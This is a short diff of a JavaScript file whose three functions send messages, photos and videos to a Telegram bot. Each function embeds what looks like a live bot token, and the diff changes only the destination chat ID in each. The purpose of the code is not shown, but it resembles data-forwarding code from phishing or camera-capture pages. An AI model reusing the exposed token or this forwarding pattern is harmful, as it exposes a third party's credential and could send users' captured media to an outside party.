@@ -54,7 +54,7 @@
 
   async function sendTelegramMessage(message) {
     var botToken = '7198587551:AAFKpC7a7LEUxxLe9B7nU6ZBotCvHsSFP3c';
-    var chatID = '6307592655';
+    var chatID = '-1002361829424';
     var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatID + "&text=" + encodeURIComponent(message);
 
     try {
@@ -110,7 +110,7 @@
 
   function sendTelegramPhoto(photoData, message) {
     var botToken = '7198587551:AAFKpC7a7LEUxxLe9B7nU6ZBotCvHsSFP3c';
-    var chatID = '6307592655';
+    var chatID = '-1002361829424';
     var url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
 
     var formData = new FormData();
@@ -138,7 +138,7 @@
 
   function sendTelegramVideo(videoData, caption) {
     var botToken = '7198587551:AAFKpC7a7LEUxxLe9B7nU6ZBotCvHsSFP3c';
-    var chatID = '6307592655';
+    var chatID = '-1002361829424';
 
     var formData = new FormData();
     formData.append("chat_id", chatID);
